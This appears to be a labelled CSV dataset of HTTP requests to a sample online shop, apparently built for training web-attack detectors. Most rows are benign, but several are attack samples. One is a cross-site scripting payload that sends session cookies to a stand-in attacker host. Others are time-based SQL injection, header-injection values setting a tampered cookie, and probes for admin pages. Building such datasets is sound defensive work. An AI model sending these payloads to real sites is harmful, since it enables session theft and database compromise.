Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,lenght,content,classification,URL,label,url_length,content_length
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C84B6EB5ACFAC3A7C41379A5C1B37F58,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mandel&pwd=tras3jada&remember=off&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1,malicious,287,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0A5AEAC8469345DDF8CC22C9D8B381FB,,close,,,1,http://localhost:8080/tienda1/publico/miembros.jsp/6909030637832563290.jsp~ HTTP/1.1,malicious,84,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8AAF24A337723C52316B66631F480B20,,close,,,0,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,benign,67,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=54AE0B4EAECC01379E0D20CD7B38BDE0,,close,,,0,http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,benign,53,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D618D8CF17B03A8A3F42455BD36C7BE8,,close,,,0,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maurizio&password=deSAPloMar&nombre=Nuri&apellidos=Forniele+Calmet&email=elwes%40enla.nu&dni=58439631N&direccion=Da+Roseira+S%2FN%2C+7A&ciudad=Pobladura+de+Pelayo+Garc%EDa&cp=16216&provincia=Burgos&ntc=9553145655570533&B1=Registrar HTTP/1.1,benign,311,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B4D16E4DF68723FEE33BCC48C6E96DCF,,close,,,0,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,benign,58,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=35E516F265A97B9AD6686F1AA5D9D870,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precioA=100&cantidad=58&B1=A%F1adir+al+carrito HTTP/1.1,malicious,131,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D32A9331F196F01D7C8FDF0197A7168F,application/x-www-form-urlencoded,Connection: close,Content-Length: 79,modo=insertar&precio=4633%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Confirmar,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,malicious,56,79
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B061BF5D1F3D1CF015C7EAA853DE5439,,close,,,0,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,benign,53,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5C32B174F1C287435C46CF4E8DA2F882,application/x-www-form-urlencoded,Connection: close,Content-Length: 107,errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,malicious,57,107
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=02BB05E9D754404B72ABA4DDB97B13E0,application/x-www-form-urlencoded,Connection: close,Content-Length: 33,errorMsg=Credenciales+incorrectas,0,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,benign,57,33
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6B19BC322CB1F3E8DB42C887A3DEAC39,application/x-www-form-urlencoded,Connection: close,Content-Length: 41,modo=insertar&precio=9089&B1=Confirmar%2F,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,malicious,56,41
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6EC68C12AFE17DBD0CC62058421E5BDE,application/x-www-form-urlencoded,Connection: close,Content-Length: 68,id=2&nombre=Vino+Rioja&precio=100&cantidad=46&B1=A%F1adir+al+carrito,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,benign,57,68
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=EAB9093516E544EDE89A330FB4F135A5,,close,,,0,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,benign,57,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=30AD2FB67092C116B0CF63D1A3D88F06,application/x-www-form-urlencoded,Connection: close,Content-Length: 78,B2=Vaciar+carritoany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,malicious,57,78
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=59F83416E4B16F91BB5DFD2CFCA06690,,close,,,1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,malicious,116,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D9FFA2963F14EDDBE6F8EF769A4624BE,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&precio=7990&B1=Pasar+por+caja HTTP/1.1,malicious,176,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F8543FBE91A8CAD32B8AB9D47493E325,,close,,,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=96&B1=A%F1adir+al+carrito HTTP/1.1,benign,126,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D9B13C619D7550CA855A7EE5166DB67F,,close,,,0,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6212&B1=Confirmar HTTP/1.1,benign,95,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C2996B39D8B807F4A989716ADF9540A1,,close,,,0,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zinkie0&password=9i3a&nombre=Esteban&apellidos=Delvalle+Llers&email=luxford_baumann%40lasiestacreativa.tel&dni=47651101T&direccion=Calle+Espiel+71+&ciudad=Rab%F3s&cp=45634&provincia=Zaragoza&ntc=8349635911694626&B1=Registrar HTTP/1.1,benign,304,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C63E96CCE607CF8244F79AC927F683F0,application/x-www-form-urlencoded,Connection: close,Content-Length: 18,B2A=Vaciar+carrito,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,malicious,57,18
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6CEA05DE56F34C6805DC2686CAD4E969,application/x-www-form-urlencoded,Connection: close,Content-Length: 60,modo=entrar&login=aluino&pwd=l0s4njear&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,benign,61,60
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8AF22DD951B18F098A6714987A544886,,close,,,0,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=maryak&password=rehenchida&nombre=Jon&apellidos=Sagaceta+Farell&email=borio-radichev%40lingote.com.gr&dni=24806506V&direccion=C%2Fja+Arco+125%2C+&ciudad=Canillas+de+R%EDo+Tuerto&cp=29719&provincia=Barcelona&ntc=8495937407634836&B1=Registrar HTTP/1.1,benign,319,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=65C67590ED0633CAE770DE17400899EF,,close,,,0,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,benign,58,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1559989FD7706867D08F14BFE1C7A234,application/x-www-form-urlencoded,Connection: close,Content-Length: 254,modo=registro&login=cimino&password=tarifa&nombre=Armengol&apellidos=Zurera+Boixadra&email=gamblers-gates9%40showeb-handling.sg&dni=39315831E&direccion=C%2F+Aires+De+La+Mar%2C+6+&ciudad=Alb%E1nchez&cp=09441&provincia=%2B&ntc=2965845845269028&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,malicious,58,254
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B267B096B88ED2B7E914D807160D1013,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=buhler&password=8ntrepei388&nombre=Edisa&apellidos=Pando+Rebull&email=charney%40pro-isfv.mp&dni=27478839A&direccion=Las+Acacias+13%2C+11-A&ciudad=Marcilla+de+Campos&cp=48320&provincia=Palencia&ntcA=6512218837130409&B1=Registrar HTTP/1.1,malicious,306,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4B26B7A71C68582EEF2EC0D6AB0406D4,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=halbert&pwd=sotalugo&remember=off&B1=Entrar HTTP/1.1,benign,123,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=854DA72E2926DD12E141819B77E7D93A,,close,,,0,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,benign,53,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=389EE88B76B265E0A94CC086E96C4261,,close,,,0,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=65&B1=A%F1adir+al+carrito HTTP/1.1,benign,132,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=EE7ECE6C7B6D07B518FCE25F09F2DFE9,application/x-www-form-urlencoded,Connection: close,Content-Length: 118,id=Set-cookie%253A%2BTamper%253D1041264011025374727&nombre=Queso+Manchego&precio=39&cantidad=98&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,malicious,57,118
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A5CE3C9B9574F040DC1B8C81F0D92003,,close,,,1,http://localhost:8080/CFIDE/administrator/index.cfm HTTP/1.1,malicious,60,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E0D11A5160F342553F85DA6E70DBFDCB,,close,,,0,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,benign,58,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=2D4C91E9202F506E58C2F352CC7A3481,,close,,,0,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,benign,53,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5FF98E4C8FF5DF4D406655E06DD3459D,application/x-www-form-urlencoded,Connection: close,Content-Length: 263,modo=registro&login=cathleen&password=5sc0za&nombre=Edilma&apellidos=Malaver+Vaz&email=tillman.clarke-smith7%407horas.cl&dniA=15942203Y&direccion=Plza.+Alvaro+De+Bazan%2C+49+1G&ciudad=Villaescusa+de+Roa&cp=09274&provincia=%C1vila&ntc=3695729312300949&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,malicious,58,263
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C12FB324DCECD315DC23B6028DFFAB30,,close,,,0,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,benign,56,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C2FDA40C73645B0DF0C48521EF2F7618,,close,,,1,http://localhost:8080/tienda1.Inc HTTP/1.1,malicious,42,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=35E68100B7D5BDB71B9B6B416D4D48DA,application/x-www-form-urlencoded,Connection: close,Content-Length: 61,modo=entrar&login=nien-hwa&pwd=PI9H329a&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,benign,61,61
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C621480AEBE9E37A5EC09CDF70CA2329,,close,,,0,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,benign,75,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=28504FC23E0344BE7D645201A21B9A06,,close,,,0,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,benign,71,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D4FFFBE82CEF5EAAE08329D789C0F287,application/x-www-form-urlencoded,Connection: close,Content-Length: 303,modo=registro&login=antonin&password=sUpLiDora&nombre=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&apellidos=Giorgis+Zabala&email=merry%40mcrspain.gg&dni=23625046K&direccion=Pla%E7a+Manuel+Corachan+S%2FN%2C+9A&ciudad=Coscurita&cp=08696&provincia=Lleida&ntc=1573270411029963&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,malicious,59,303
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C3A8EA7A702EA95FBF0CC50591B051FA,application/x-www-form-urlencoded,Connection: close,Content-Length: 4,id=1,0,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,benign,66,4
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5A7ED857CF0BF2D9DF4A6C15CF0EF2DC,,close,,,0,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,benign,53,0
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D3A0D9A76BE9969BAA299581B60381F2,,close,,,0,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,benign,56,0
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5B922D3E69FDD62BDD364AFA666C0F48,application/x-www-form-urlencoded,Connection: close,Content-Length: 253,modo=registro&login=shuman6&password=zool%F37IC1&nombre=Gisela&apellidos=Boccaccini+Basart&email=butalov0%40lettere.dm&dni=61323691X&direccion=Alfredo+Calderon+136+&ciudad=Poblaci%F3n+de+Arroyo&cp=10817&provincia=Burgos&ntc=8833519281549056&B1=Registrar,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,benign,58,253
